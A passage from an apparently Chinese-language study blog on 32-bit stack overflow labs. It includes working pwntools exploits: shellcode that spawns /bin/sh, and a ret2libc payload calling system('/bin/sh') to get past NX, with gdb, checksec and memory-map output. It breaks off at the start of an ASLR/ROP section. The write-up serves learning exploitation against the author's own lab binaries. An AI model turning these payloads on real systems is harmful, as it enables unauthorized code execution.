<p>所以正确的retaddress = 0xffffc1f0</p>
<h2 id="编写exploit"><a href="#编写exploit" class="headerlink" title="编写exploit"></a>编写exploit</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = <span class="built_in">process</span>(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0xffffc7b0</span> <span class="meta"># first time</span></span><br><span class="line">ret = <span class="number">0xffffc1f0</span> <span class="meta"># second time</span></span><br><span class="line"></span><br><span class="line">shellcode = b<span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += b<span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += b<span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + <span class="built_in">p32</span>(ret)</span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">sendline</span>(payload)</span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>

<h1 id="Ret2libc-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#Ret2libc-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="Ret2libc - Bypass DEP (通过ret2libc绕过DEP防护)"></a>Ret2libc - Bypass DEP (通过ret2libc绕过DEP防护)</h1><ul>
<li>DEP(Data Execution Prevention): 即数据执行保护. 软件级别的DEP保护有NX保护, 即限制特定内存不可执行, 比如说堆栈不可执行.</li>
</ul>
<h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>前置条件:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╭─lamecrow@LAPTOP-PUE31HT9 ~/code/c/pwn/zm_rop/lab2</span><br><span class="line">╰─$ checksec level2</span><br><span class="line">[*] <span class="string">&#x27;/home/lamecrow/code/c/pwn/zm_rop/lab2/level2&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>Stack’s canary: 关闭</li>
<li>NX: 开启</li>
<li>PIE: 关闭</li>
<li>程序中没有出现system函数和字符串</li>
</ul>
<p>流程: </p>
<ul>
<li>找到溢出点 (因为无需使用shellcode, 直接可以跳转到system, 所以不需要找到在堆栈中的起始地址, payload构造起来也相对简单些)</li>
<li>gdb调试, print命令找到system的函数地址</li>
<li>gdb调试, search命令找到”/bin/sh”字符串地址</li>
<li>确定system的返回地址, 一般是随意的</li>
<li>构造payload: <code>填充 + (当前函数返回地址 -&gt; system) + (system函数返回地址 -&gt; 任意地址) + (参数 -&gt; &quot;/bin/sh&quot;字符串地址)</code>​</li>
</ul>
<h2 id="实验代码-1"><a href="#实验代码-1" class="headerlink" title="实验代码"></a>实验代码</h2><p>实验代码不变, 只在编译时开启NX保护</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector </span><br></pre></td></tr></table></figure>

<h2 id="确定ret-address"><a href="#确定ret-address" class="headerlink" title="确定ret_address"></a>确定ret_address</h2><p>因为重新编译过, 输入字符串在栈中的位置会发生改变, 所以需要重新校准.</p>
<p>首先输入字符串覆盖返回地址, 造成内存错误, 并生成coredump文件.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2$ ./level2                                                         </span><br><span class="line"><span class="number">111111111111111111111111111111</span><span class="function">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2222                                                                                                                                    Segmentation <span class="title">fault</span> <span class="params">(core dumped)</span></span></span><br></pre></td></tr></table></figure>

<p>然后使用gdb调试, 查看字符串起始地址, 也就是ret_address的值</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10b</span>x $esp - <span class="number">144</span>                                                                             │</span><br><span class="line"><span class="number">0xffffd2b0</span>:     <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>    <span class="number">0x31</span>                           │</span><br><span class="line"><span class="number">0xffffd2b8</span>:     <span class="number">0x31</span>    <span class="number">0x31</span></span><br></pre></td></tr></table></figure>

<p>修改后的exploit.py</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">2</span></span><br><span class="line"> <span class="number">3</span> conn = <span class="built_in">process</span>(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"> <span class="number">4</span></span><br><span class="line"> <span class="number">5</span> # level2</span><br><span class="line"> <span class="number">6</span> ret = <span class="number">0xffffd2b0</span></span><br><span class="line"> <span class="number">7</span></span><br><span class="line"> <span class="number">8</span> shellcode = b<span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line"> <span class="number">9</span> shellcode += b<span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line"><span class="number">10</span> shellcode += b<span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> payload = shellcode + b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + <span class="built_in">p32</span>(ret)</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span> <span class="meta">#pause()</span></span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span> conn.<span class="built_in">sendline</span>(payload)</span><br><span class="line"><span class="number">17</span></span><br><span class="line"><span class="number">18</span> conn.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>

<p>运行该脚本, 得到错误输出, 信号是SIGSEGV, 说明是访问了非法的内存, 也就是执行了没有执行权限的栈内存.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2$ python3 exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./level2&#x27;</span>: pid <span class="number">30225</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ ls</span><br><span class="line">[*] Process <span class="string">&#x27;./level2&#x27;</span> stopped with exit code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">30225</span>)                                                                   [*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>

<h2 id="验证NX保护"><a href="#验证NX保护" class="headerlink" title="验证NX保护"></a>验证NX保护</h2><h3 id="level2栈权限"><a href="#level2栈权限" class="headerlink" title="level2栈权限"></a>level2栈权限</h3><p>在exploit中使用pause(), 暂停进程并记录PID</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2$ python3 exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./level2&#x27;</span>: pid <span class="number">1200</span></span><br><span class="line">[*] <span class="built_in">Paused</span> (press any to <span class="keyword">continue</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ exit</span><br><span class="line">[*] Process <span class="string">&#x27;./level2&#x27;</span> stopped with exit code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">1200</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>

<p>然后查看该进程的内存映射, 最后一行stack的内存权限是: 可读可写且为私有段(s表示共享段), 但是<strong>不可执行</strong>.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1$ sudo cat /proc/<span class="number">1200</span>/maps</span><br><span class="line">[sudo] password <span class="keyword">for</span> lamecrow:</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">7881299348170901</span>                   /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">7881299348170901</span>                   /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">7881299348170901</span>                   /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0804</span>c000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">7881299348170901</span>                   /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2</span><br><span class="line"><span class="number">0804</span>c000<span class="number">-0804</span>d000 rw-p <span class="number">00003000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">7881299348170901</span>                   /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2</span><br><span class="line">f7d7f000-f7d9f000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7d9f000-f7f21000 r-xp <span class="number">00020000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f21000-f7fa6000 r--p <span class="number">001</span>a2000 <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa6000-f7fa7000 ---p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa7000-f7fa9000 r--p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa9000-f7faa000 rw-p <span class="number">00229000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7faa000-f7fb4000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7fbe000-f7fc0000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7fc0000-f7fc4000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vvar]</span><br><span class="line">f7fc4000-f7fc6000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vdso]</span><br><span class="line">f7fc6000-f7fc7000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7fc7000-f7fec000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7fec000-f7ffb000 r--p <span class="number">00026000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7ffb000-f7ffd000 r--p <span class="number">00034000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7ffd000-f7ffe000 rw-p <span class="number">00036000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">fffdd000-ffffe000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [stack]</span><br></pre></td></tr></table></figure>

<p>为了验证, 重复上述步骤查看level1的stack</p>
<h3 id="level1栈权限"><a href="#level1栈权限" class="headerlink" title="level1栈权限"></a>level1栈权限</h3><p>首先添加pause(), 并运行exploit.py</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1$ python3 exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./level1&#x27;</span>: pid <span class="number">12907</span></span><br><span class="line">[*] <span class="built_in">Paused</span> (press any to <span class="keyword">continue</span>)</span><br></pre></td></tr></table></figure>

<p>然后查看其maps文件, 最后一行的stack的内存权限是: <strong>可执行</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1$ sudo cat /proc/<span class="number">12907</span>/maps</span><br><span class="line">[sudo] password <span class="keyword">for</span> lamecrow:</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">45317471250514877</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">45317471250514877</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">45317471250514877</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0804</span>c000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">45317471250514877</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1</span><br><span class="line"><span class="number">0804</span>c000<span class="number">-0804</span>d000 rw-p <span class="number">00003000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">45317471250514877</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1</span><br><span class="line">f7d7f000-f7d9f000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7d9f000-f7f21000 r-xp <span class="number">00020000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f21000-f7fa6000 r--p <span class="number">001</span>a2000 <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa6000-f7fa7000 ---p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa7000-f7fa9000 r--p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7fa9000-f7faa000 rw-p <span class="number">00229000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7faa000-f7fb4000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7fbe000-f7fc0000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7fc0000-f7fc4000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vvar]</span><br><span class="line">f7fc4000-f7fc6000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vdso]</span><br><span class="line">f7fc6000-f7fc7000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7fc7000-f7fec000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7fec000-f7ffb000 r--p <span class="number">00026000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7ffb000-f7ffd000 r--p <span class="number">00034000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7ffd000-f7ffe000 rw-p <span class="number">00036000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">fffdd000-ffffe000 rwxp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [stack]</span><br></pre></td></tr></table></figure>

<h2 id="思路梳理"><a href="#思路梳理" class="headerlink" title="思路梳理"></a>思路梳理</h2><ul>
<li><p>当前问题: 无法在堆栈中执行代码, 而字符串也是用push的方式存入堆栈的, 所以当前面临两个困境</p>
<ul>
<li>无法执行system</li>
<li>没有”/bin/sh字符串”</li>
</ul>
</li>
<li><p>解决: <strong>level2调用了libc.so库</strong>, 并且<strong>libc.so保存了大量可利用函数</strong>(解决问题一), 如果可以让程序执行system(“/bin/sh”), 也可以获取shell.</p>
</li>
</ul>
<p>如果关闭ASLR(数据段地址随机化), <strong>system()函数在内存中的地址不会发生变化, 并且libc.so中也包含了&quot;/bin/sh&quot;字符串, 并且这个字符串的地址也是固定的.</strong> </p>
<h2 id="find-system-amp-“-bin-sh”"><a href="#find-system-amp-“-bin-sh”" class="headerlink" title="find system &amp; “/bin/sh”"></a>find system &amp; “/bin/sh”</h2><p>使用gdb调试level2, 在main函数处下一个断点, 因为libc动态库需要程序运行时才加载到程序内存中, 在程序运行到main函数时libc已经加载完成.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------- <span class="function">tip of the <span class="title">day</span> <span class="params">(disable with set show-tips off)</span> -------                                                                                                               │</span></span><br><span class="line"><span class="function">Disable Pwndbg context information display with set context-sections &#x27;&#x27;                                                                                                       │</span></span><br><span class="line"><span class="function">pwndbg&gt; <span class="keyword">break</span> main                                                                                                                                                            │</span></span><br><span class="line"><span class="function">Breakpoint 1 at 0x80491ca                                                                                                                                                     │</span></span><br><span class="line"><span class="function">pwndbg&gt; run                                                                                                                                                                   │</span></span><br><span class="line"><span class="function">Starting program: /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level2/level2                                                                                                         │</span></span><br><span class="line"><span class="function">[Thread debugging using libthread_db enabled]                                                                                                                                 │</span></span><br><span class="line"><span class="function">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.                                                                                                    │</span></span><br><span class="line"><span class="function">                                                                                                                                                                              │</span></span><br><span class="line"><span class="function">Breakpoint <span class="number">1</span>, <span class="number">0x080491ca</span> in main ()                                                                                                                                           │</span></span><br></pre></td></tr></table></figure>

<p>使用print打印对应符号的信息, 找到了system函数的地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print system                                                                                                                                                          │</span><br><span class="line">$<span class="number">3</span> = &#123;<span class="built_in"><span class="keyword">int</span></span> (<span class="keyword">const</span> <span class="keyword">char</span> *)&#125; <span class="number">0xf7dc7150</span> &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>

<p>使用search全局搜索, 找到”/bin/sh”字符串</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t string /bin/sh                                                                                                                                              │</span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>                                                                                                                                           │</span><br><span class="line">libc.so<span class="number">.6</span>       <span class="number">0xf7f3c0f5</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="编写Exploit"><a href="#编写Exploit" class="headerlink" title="编写Exploit"></a>编写Exploit</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">2</span></span><br><span class="line"> <span class="number">3</span> conn = <span class="built_in">process</span>(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"> <span class="number">4</span></span><br><span class="line"> <span class="number">5</span> system = <span class="number">0xf7dc7150</span></span><br><span class="line"> <span class="number">6</span> ret = <span class="number">0xdeadbeef</span></span><br><span class="line"> <span class="number">7</span> shell = <span class="number">0xf7f3c0f5</span></span><br><span class="line"> <span class="number">8</span></span><br><span class="line"> <span class="number">9</span> payload = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">140</span> + <span class="built_in">p32</span>(system) + <span class="built_in">p32</span>(ret) + <span class="built_in">p32</span>(shell)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> conn.<span class="built_in">sendline</span>(payload)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span> conn.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>

<p>为什么payload要这样排布, 应该代入到调用system的上下文中:</p>
<ul>
<li>首先会将字符串参数压入栈中, 所以”/bin/sh”的地址会在最下方</li>
<li>然后call指令会将返回地址压入栈中, 所以倒数第二个是最终的返回地址, 但是已经调用system创建子进程了, 所以父进程的返回地址就无所谓了, 可以随意构造</li>
<li>然后最上方的system地址是retn的返回地址, 在retn后实际上是pop了一次, 所以esp会推到ret处, 再观察栈中内容, 会发现和call后的栈内容一样 <strong>(特别是返回地址, 字符串参数的偏移是没有错误的)</strong> , 所以后续system不论是获取参数还是返回都是正常的.</li>
</ul>
<h1 id="ROP-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR"><a href="#ROP-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR" class="headerlink" title="ROP - Bypass DEP and ASLR (通过ROP绕过DEP和ASLR)"></a>ROP - Bypass DEP and ASLR (通过ROP绕过DEP和ASLR)</h1><ul>
<li>ASLR(数据地址随机化): 在checksec中叫做PIE(Position-Independent Executable).</li>
</ul>
<h2 id="实验代码-2"><a href="#实验代码-2" class="headerlink" title="实验代码"></a>实验代码</h2><p>仍然是level1.c, 打开ASLR保护</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo <span class="number">2</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>编译命令</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -m32 ../lab1/level1.c -o level3</span><br></pre></td></tr></table></figure>

<p>使用checksec查看安全属性</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╭─lamecrow@LAPTOP-PUE31HT9 ~/code/c/pwn/zm_rop/lab3</span><br><span class="line">╰─$ checksec level3</span><br><span class="line">[*] <span class="string">&#x27;/home/lamecrow/code/c/pwn/zm_rop/lab3/level3&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="验证ASLR"><a href="#验证ASLR" class="headerlink" title="验证ASLR"></a>验证ASLR</h2><h3 id="测试level2的exploit脚本"><a href="#测试level2的exploit脚本" class="headerlink" title="测试level2的exploit脚本"></a>测试level2的exploit脚本</h3><p>无法获取shell</p>
